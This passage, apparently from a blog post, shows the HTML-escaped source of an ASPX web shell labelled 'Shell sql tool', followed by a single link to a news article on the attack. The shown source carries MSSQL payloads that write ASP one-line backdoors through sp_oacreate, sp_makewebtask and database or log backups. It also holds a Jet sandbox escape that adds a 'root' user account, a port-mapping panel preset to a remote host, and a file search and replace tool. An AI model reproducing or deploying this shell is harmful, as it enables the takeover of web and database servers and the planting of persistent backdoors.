Value=&quot;EXEC MASTER..XP_dirtree &#39;c:\&#39;,1,1&quot;<span class="ni">&amp;gt;</span>XP_dirtree<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;Declare @s int;exec sp_oacreate &#39;wscript.shell&#39;,@s out;Exec SP_OAMethod @s,&#39;run&#39;,NULL,&#39;cmd.exe /c echo ^<span class="ni">&amp;lt;</span>%execute(request(char(35)))%^<span class="ni">&amp;gt;&amp;gt;</span>c:\bin.asp&#39;;&quot;<span class="ni">&amp;gt;</span>SP_oamethod exec<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;sp_makewebtask @outputfile=&#39;c:\bin.asp&#39;,@charset=gb2312,@query=&#39;select &#39;&#39;<span class="ni">&amp;lt;</span>%execute(request(chr(35)))%<span class="ni">&amp;gt;</span>&#39;&#39;&#39;&quot;<span class="ni">&amp;gt;</span>SP_makewebtask make file<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,1;select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database=c:\windows\system32\ias\ias.mdb&#39;,&#39;select shell(<span class="ni">&amp;#34;</span>cmd.exe /c net user root root/add <span class="ni">&amp;#34;</span>)&#39;)&quot;<span class="ni">&amp;gt;</span>SandBox<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup log @a to disk=@s;insert into [bin_cmd](cmd)values(&#39;<span class="ni">&amp;lt;</span>%execute(request(chr(35)))%<span class="ni">&amp;gt;</span>&#39;);declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t=&#39;e:\1.asp&#39; backup log @b to disk=@t with init,no_truncate;drop table [bin_cmd];&quot;<span class="ni">&amp;gt;</span>LogBackup<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup database @a to disk=@s;insert into [bin_cmd](cmd)values(&#39;<span class="ni">&amp;lt;</span>%execute(request(chr(35)))%<span class="ni">&amp;gt;</span>&#39;);declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t=&#39;c:\bin.asp&#39; backup database @b to disk=@t WITH DIFFERENTIAL,FORMAT;drop table [bin_cmd];&quot;<span class="ni">&amp;gt;</span>DatabaseBackup<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>/asp:DropDownList<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>table width=&quot;200&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;<span class="ni">&amp;gt;&amp;lt;</span>tr<span class="ni">&amp;gt;&amp;lt;</span>td<span class="ni">&amp;gt;</span> Run SQL <span class="ni">&amp;lt;</span>/td<span class="ni">&amp;gt;&amp;lt;</span>/tr<span class="ni">&amp;gt;&amp;lt;</span>tr<span class="ni">&amp;gt;&amp;lt;</span>td<span class="ni">&amp;gt;&amp;lt;</span>textarea id=&quot;jHIy&quot; class=&quot;area&quot; style=&quot;width:600px;height:60px;overflow:auto;&quot; runat=&quot;server&quot; rows=&quot;6&quot; cols=&quot;1&quot;<span class="ni">&amp;gt;&amp;lt;</span>/textarea<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;&amp;lt;</span>/tr<span class="ni">&amp;gt;&amp;lt;</span>tr<span class="ni">&amp;gt;&amp;lt;</span>td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:Button runat=&quot;server&quot; ID=&quot;WOhJ&quot; CssClass=&quot;bt&quot; Text=&quot;Query&quot; onclick=&quot;ORUgV&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;&amp;lt;</span>/tr<span class="ni">&amp;gt;&amp;lt;</span>/table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div style=&quot;overflow-x:auto;width:950px&quot; <span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:DataGrid runat=&quot;server&quot; ID=&quot;rom&quot; HeaderStyle-CssClass=&quot;head&quot; BorderWidth=&quot;0&quot; GridLines=&quot;None&quot; <span class="ni">&amp;gt;&amp;lt;</span>/asp:DataGrid<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%--PortMap--%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;hOWTm&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;4&quot; cellspacing=&quot;0&quot; style=&quot;margin:10px 0;&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>tr align=&quot;center&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:5%&quot;<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:20%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;</span>Local Ip : <span class="ni">&amp;lt;</span>input class=&quot;input&quot; runat=&quot;server&quot; id=&quot;eEpm&quot; type=&quot;text&quot; size=&quot;20&quot; value=&quot;127.0.0.1&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:20%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;</span>Local Port : <span class="ni">&amp;lt;</span>input class=&quot;input&quot; runat=&quot;server&quot; id=&quot;iXdh&quot; type=&quot;text&quot; size=&quot;20&quot; value=&quot;3389&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:20%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;</span>Remote Ip : <span class="ni">&amp;lt;</span>input class=&quot;input&quot; runat=&quot;server&quot; id=&quot;llH&quot; type=&quot;text&quot; size=&quot;20&quot; value=&quot;www.rootkit.net.cn&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:20%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;</span>Remote Port : <span class="ni">&amp;lt;</span>input class=&quot;input&quot; runat=&quot;server&quot; id=&quot;ZHS&quot; type=&quot;text&quot; size=&quot;20&quot; value=&quot;80&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;&amp;lt;</span>/tr<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>tr align=&quot;center&quot;<span class="ni">&amp;gt;&amp;lt;</span>td colspan=&quot;5&quot;<span class="ni">&amp;gt;&amp;lt;</span>br/<span class="ni">&amp;gt;&amp;lt;</span>asp:Button ID=&quot;FJE&quot; CssClass=&quot;bt&quot; runat=&quot;server&quot; Text=&quot;MapPort&quot; OnClick=&quot;wDZ&quot;/<span class="ni">&amp;gt;</span> <span class="ni">&amp;lt;</span>asp:Button ID=&quot;giX&quot; CssClass=&quot;bt&quot; runat=&quot;server&quot; Text=&quot;ClearAll&quot; OnClick=&quot;vJNsE&quot;/<span class="ni">&amp;gt;</span> <span class="ni">&amp;lt;</span>asp:Button ID=&quot;GFsm&quot; CssClass=&quot;bt&quot; runat=&quot;server&quot; Text=&quot;Refresh&quot; OnClick=&quot;tYoZ&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;&amp;lt;</span>/tr<span class="ni">&amp;gt;&amp;lt;</span>/table<span class="ni">&amp;gt;&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%--Search--%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;yhv&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;4&quot; cellspacing=&quot;0&quot; style=&quot;margin:10px 0;&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>tr align=&quot;center&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:20%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;</span>Keyword<span class="ni">&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:60%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;&amp;lt;</span>textarea id=&quot;iaMKl&quot; runat=&quot;server&quot; class=&quot;area&quot; style=&quot;width:100%&quot; rows=&quot;4&quot;<span class="ni">&amp;gt;&amp;lt;</span>/textarea<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:20%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;&amp;lt;</span>input type=&quot;checkbox&quot; runat=&quot;server&quot; id=&quot;rAQ&quot; value=&quot;1&quot;/<span class="ni">&amp;gt;</span> Use Regex<span class="ni">&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/tr<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>tr align=&quot;center&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:20%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;</span>Replace As<span class="ni">&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:60%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;&amp;lt;</span>textarea id=&quot;qPe&quot; runat=&quot;server&quot; class=&quot;area&quot; style=&quot;width:100%&quot; rows=&quot;4&quot;<span class="ni">&amp;gt;&amp;lt;</span>/textarea<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:20%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;&amp;lt;</span>input type=&quot;checkbox&quot; runat=&quot;server&quot; id=&quot;YZw&quot;/<span class="ni">&amp;gt;</span> Replace<span class="ni">&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/tr<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>tr align=&quot;center&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:20%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;</span>Search FileType<span class="ni">&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:60%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;&amp;lt;</span>input type=&quot;text&quot; runat=&quot;server&quot; class=&quot;input&quot; id=&quot;UDLvA&quot; style=&quot;width:100%&quot; value=&quot;asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:20%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;&amp;lt;</span>asp:DropDownList runat=&quot;server&quot; ID=&quot;Ven&quot; AutoPostBack=&quot;False&quot; CssClass=&quot;list&quot;<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;name&quot;<span class="ni">&amp;gt;</span>File Name<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;content&quot; Selected=&quot;True&quot;<span class="ni">&amp;gt;</span>File Content<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>/asp:DropDownList<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/tr<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>tr align=&quot;center&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:20%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;</span>Path<span class="ni">&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:60%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;&amp;lt;</span>input type=&quot;text&quot; class=&quot;input&quot; id=&quot;NaLJ&quot; runat=&quot;server&quot; style=&quot;width:100%&quot; /<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:20%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;&amp;lt;</span>asp:Button CssClass=&quot;bt&quot; id=&quot;axy&quot; runat=&quot;server&quot; onclick=&quot;NBy&quot; Text=&quot;Start&quot; /<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/tr<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>br/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>br/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:Table ID=&quot;oJiym&quot; runat=&quot;server&quot; Width=&quot;100%&quot; CellSpacing=&quot;0&quot; <span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:TableRow CssClass=&quot;head&quot;<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell Width=&quot;60%&quot;<span class="ni">&amp;gt;</span>File Path<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell Width=&quot;20%&quot;<span class="ni">&amp;gt;</span>Last modified<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell Width=&quot;20%&quot;<span class="ni">&amp;gt;</span>Size<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>/asp:TableRow<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/asp:Table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/td<span class="ni">&amp;gt;&amp;lt;</span>/tr<span class="ni">&amp;gt;&amp;lt;</span>/table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div style=&quot;padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;&quot;<span class="ni">&amp;gt;</span>Copyright <span class="ni">&amp;copy;</span> 2006-2009 <span class="ni">&amp;lt;</span>a href=&quot;http://alikaptanoglu.blogspot.com&quot; target=&quot;_blank&quot;<span class="ni">&amp;gt;</span>Shell sql tool<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span> All Rights Reserved.<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/form<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/body<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/html<span class="ni">&amp;gt;</span></code></pre></div>
 
 <p>You can read more about the script <a href="http://www.zdnet.com/article/one-year-old-unpatched-windows-token-kidnapping-under-attack/" title="ASPX Shell">here</a></p>
 
